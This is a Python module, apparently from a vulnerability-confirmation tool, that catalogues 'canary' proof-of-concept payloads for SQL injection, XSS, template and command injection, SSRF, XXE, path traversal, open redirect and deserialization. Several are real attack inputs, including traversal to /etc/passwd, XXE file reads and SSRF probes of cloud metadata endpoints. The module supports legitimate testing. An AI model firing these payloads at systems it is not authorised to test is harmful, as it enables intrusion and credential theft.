"""
RedTeef — safe proof-of-concept payload builder.

Builds targeted, *non-destructive* payloads to confirm specific vulnerability
classes.  Each CWE / vulnerability type has a set of "canary" payloads that
produce a predictable, harmless side-effect if the vulnerability is real.
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger("krumpa.redteef.payload_builder")


# ------------------------------------------------------------------
# Data structures
# ------------------------------------------------------------------

@dataclass
class ProofPayload:
    """A single PoC payload plus metadata used for confirmation."""
    vuln_type: str                 # e.g. "sqli", "xss", "ssti", "cmdi", "idor"
    payload: str                   # the actual string to inject
    expected_indicator: str        # regex or literal expected in the response
    is_regex: bool = False         # whether *expected_indicator* is a regex
    http_method: str = "POST"
    inject_location: str = "body"  # "body", "header", "url"
    inject_field: str = ""         # the specific field name
    description: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)


# ------------------------------------------------------------------
# Payload catalogue (safe canaries)
# ------------------------------------------------------------------

_SQLI_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="sqli",
        payload="' AND '1'='1",
        expected_indicator="",
        description="Tautology — should return same result as original",
    ),
    ProofPayload(
        vuln_type="sqli",
        payload="' AND '1'='2",
        expected_indicator="",
        description="Contradiction — response should differ from tautology",
    ),
    ProofPayload(
        vuln_type="sqli",
        payload="' AND SLEEP(0)--",
        expected_indicator="",
        description="Zero-delay sleep — baseline for timing comparison",
    ),
]

_XSS_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="xss",
        payload="<krumpa-xss-test>",
        expected_indicator="<krumpa-xss-test>",
        description="Harmless custom tag — reflected means no output encoding",
    ),
    ProofPayload(
        vuln_type="xss",
        payload='"><krumpa-xss-test>',
        expected_indicator="<krumpa-xss-test>",
        description="Break out of attribute context",
    ),
]

_SSTI_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="ssti",
        payload="{{7*191}}",
        expected_indicator="1337",
        description="Jinja2 / Twig math expression",
    ),
    ProofPayload(
        vuln_type="ssti",
        payload="${7*191}",
        expected_indicator="1337",
        description="Expression language math",
    ),
]

_CMDI_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="cmdi",
        payload="; echo krumpa-canary",
        expected_indicator="krumpa-canary",
        description="Echo canary string",
    ),
    ProofPayload(
        vuln_type="cmdi",
        payload="| echo krumpa-canary",
        expected_indicator="krumpa-canary",
        description="Pipe echo canary",
    ),
]

_IDOR_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="idor",
        payload="0",
        expected_indicator="",
        description="Access resource id=0 (often admin/system)",
    ),
    ProofPayload(
        vuln_type="idor",
        payload="1",
        expected_indicator="",
        description="Access resource id=1 (another user's resource)",
    ),
]

# -- New Phase-1 canary sets ------------------------------------------------

_SSRF_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="ssrf",
        payload="http://127.0.0.1:80",
        expected_indicator="",
        description="Localhost probe — basic SSRF check",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="ssrf",
        payload="http://169.254.169.254/latest/meta-data/",
        expected_indicator="ami-id",
        description="AWS metadata endpoint — cloud SSRF",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="ssrf",
        payload="http://metadata.google.internal/computeMetadata/v1/",
        expected_indicator="",
        description="GCP metadata endpoint — cloud SSRF",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="ssrf",
        payload="http://[::1]:80/",
        expected_indicator="",
        description="IPv6 localhost — bypass filter",
        inject_location="body",
    ),
]

_XXE_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="xxe",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "krumpa-xxe-canary">]><root>&xxe;</root>',
        expected_indicator="krumpa-xxe-canary",
        description="Basic XML entity expansion",
        http_method="POST",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="xxe",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/null">]><root>&xxe;</root>',
        expected_indicator="",
        description="File-read XXE (Unix dev/null — safe)",
        http_method="POST",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="xxe",
        payload='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        expected_indicator="extensions",
        description="File-read XXE (Windows win.ini — safe)",
        http_method="POST",
        inject_location="body",
    ),
]

_PATH_TRAVERSAL_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="path_traversal",
        payload="../../../etc/passwd",
        expected_indicator="root:",
        is_regex=False,
        description="Unix passwd traversal",
        inject_location="url",
    ),
    ProofPayload(
        vuln_type="path_traversal",
        payload="..\\..\\..\\windows\\win.ini",
        expected_indicator="extensions",
        description="Windows win.ini traversal",
        inject_location="url",
    ),
    ProofPayload(
        vuln_type="path_traversal",
        payload="....//....//....//etc/passwd",
        expected_indicator="root:",
        description="Double-dot-slash filter bypass",
        inject_location="url",
    ),
    ProofPayload(
        vuln_type="path_traversal",
        payload="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        expected_indicator="root:",
        description="URL-encoded traversal",
        inject_location="url",
    ),
]

_OPEN_REDIRECT_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="open_redirect",
        payload="https://evil.example.com",
        expected_indicator=r"(?:Location|location):\s*https://evil\.example\.com",
        is_regex=True,
        description="Absolute URL redirect",
        http_method="GET",
        inject_location="url",
    ),
    ProofPayload(
        vuln_type="open_redirect",
        payload="//evil.example.com",
        expected_indicator=r"(?:Location|location):\s*//evil\.example\.com",
        is_regex=True,
        description="Protocol-relative redirect",
        http_method="GET",
        inject_location="url",
    ),
    ProofPayload(
        vuln_type="open_redirect",
        payload="/\\evil.example.com",
        expected_indicator=r"(?:Location|location):\s*/\\\\evil",
        is_regex=True,
        description="Backslash-based redirect bypass",
        http_method="GET",
        inject_location="url",
    ),
]

_DESERIALIZATION_CANARIES: List[ProofPayload] = [
    ProofPayload(
        vuln_type="deserialization",
        payload='{"@type":"java.lang.Runtime"}',
        expected_indicator=r"(?:ClassNotFoundException|autoType|deseriali)",
        is_regex=True,
        description="Fastjson / Jackson polymorphic type probe",
        http_method="POST",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="deserialization",
        payload="O:8:\"stdClass\":0:{}",
        expected_indicator=r"(?:unserialize|__wakeup|allowed_classes)",
        is_regex=True,
        description="PHP object deserialization probe",
        http_method="POST",
        inject_location="body",
    ),
    ProofPayload(
        vuln_type="deserialization",
        payload='{"__class__": "GatekrumpaProbe"}',
        expected_indicator=r"(?:class|deseriali|pickle|yaml\.load)",
        is_regex=True,
        description="Python pickle / YAML probe",
        http_method="POST",
        inject_location="body",
    ),
]

_CANARY_CATALOGUE: Dict[str, List[ProofPayload]] = {
    "sqli": _SQLI_CANARIES,
    "xss": _XSS_CANARIES,
    "ssti": _SSTI_CANARIES,
    "cmdi": _CMDI_CANARIES,
    "idor": _IDOR_CANARIES,
    "ssrf": _SSRF_CANARIES,
    "xxe": _XXE_CANARIES,
    "path_traversal": _PATH_TRAVERSAL_CANARIES,
    "open_redirect": _OPEN_REDIRECT_CANARIES,
    "deserialization": _DESERIALIZATION_CANARIES,
}


# ------------------------------------------------------------------
# PayloadBuilder
# ------------------------------------------------------------------

class PayloadBuilder:
    """
    Build confirmation payloads appropriate for a given vulnerability type.

    Parameters
    ----------
    extra_canaries:
        User-supplied canaries to merge into the catalogue.
    """

    def __init__(
        self,
        *,
        extra_canaries: Optional[Dict[str, List[ProofPayload]]] = None,
    ) -> None:
        self._catalogue: Dict[str, List[ProofPayload]] = {}
        for key, canaries in _CANARY_CATALOGUE.items():
            self._catalogue[key] = list(canaries)
        if extra_canaries:
            for key, canaries in extra_canaries.items():
                self._catalogue.setdefault(key, []).extend(canaries)

    @property
    def supported_types(self) -> List[str]:
        """Return the list of vulnerability type keys with canaries."""
        return sorted(self._catalogue.keys())

    def build(
        self,
        vuln_type: str,
        *,
        inject_field: str = "",
        http_method: str = "POST",
        inject_location: str = "body",
    ) -> List[ProofPayload]:
        """
        Return a list of :class:`ProofPayload` objects for *vuln_type*,
        customised with the given injection context.
        """
        templates = self._catalogue.get(vuln_type, [])
        if not templates:
            logger.warning("No canaries for vuln_type=%r", vuln_type)
            return []

        payloads: List[ProofPayload] = []
        for tmpl in templates:
            pp = ProofPayload(
                vuln_type=tmpl.vuln_type,
                payload=tmpl.payload,
                expected_indicator=tmpl.expected_indicator,
                is_regex=tmpl.is_regex,
                http_method=http_method,
                inject_location=inject_location,
                inject_field=inject_field,
                description=tmpl.description,
                metadata=dict(tmpl.metadata),
            )
            payloads.append(pp)
        return payloads

    def infer_vuln_type(self, finding_tags: List[str], finding_title: str = "") -> Optional[str]:
        """
        Best-effort inference of the vuln_type key from finding tags / title.
        """
        tag_set = {t.lower() for t in finding_tags}
        title_lower = finding_title.lower()

        mapping = [
            ({"sqli", "sql", "injection"}, "sqli"),
            ({"xss", "reflection", "cross-site"}, "xss"),
            ({"ssti", "template"}, "ssti"),
            ({"cmdi", "command", "rce"}, "cmdi"),
            ({"idor", "insecure-direct"}, "idor"),
            ({"ssrf", "server-side-request"}, "ssrf"),
            ({"xxe", "xml-external", "xml-entity"}, "xxe"),
            ({"path-traversal", "traversal", "lfi", "directory-traversal"}, "path_traversal"),
            ({"open-redirect", "redirect", "url-redirect"}, "open_redirect"),
            ({"deserialization", "deserializ", "insecure-deserial", "pickle", "marshalling"}, "deserialization"),
        ]
        for keywords, vtype in mapping:
            if keywords & tag_set:
                return vtype
            for kw in keywords:
                if kw in title_lower:
                    return vtype
        return None
